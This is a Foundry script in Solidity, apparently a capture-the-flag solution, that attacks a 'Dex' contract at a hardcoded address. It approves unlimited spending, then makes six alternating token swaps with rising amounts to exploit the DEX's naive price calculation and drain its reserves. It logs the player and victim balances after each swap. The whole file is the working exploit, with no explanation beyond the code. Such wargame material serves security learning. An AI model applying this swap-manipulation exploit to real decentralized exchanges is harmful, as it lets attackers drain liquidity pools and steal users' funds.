// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Dex.sol";

contract Solve is Script {
    Dex victim;

    IERC20 token1;
    IERC20 token2;

    function setUp() external {
        victim = Dex(0x46388136cAde25D1C4D68e18A3Fce1B69Bc87CfC);
        token1 = IERC20(victim.token1());
        token2 = IERC20(victim.token2());
    }

    function run() external { 
        vm.startBroadcast();

        victim.approve(address(victim), type(uint256).max); _print();
        victim.swap(address(token1), address(token2), 10); _print();
        victim.swap(address(token2), address(token1), 20); _print();
        victim.swap(address(token1), address(token2), 24); _print();
        victim.swap(address(token2), address(token1), 30); _print();
        victim.swap(address(token1), address(token2), 41); _print();
        victim.swap(address(token2), address(token1), 45); _print();

        vm.stopBroadcast();
    }

    function _print() private view {
        console.log("player token1:", token1.balanceOf(address(tx.origin)));
        console.log("player token2:", token2.balanceOf(address(tx.origin)));
        console.log("victim token1:", token1.balanceOf(address(victim)));
        console.log("victim token2:", token2.balanceOf(address(victim)));
        console.log("=============");
    }
}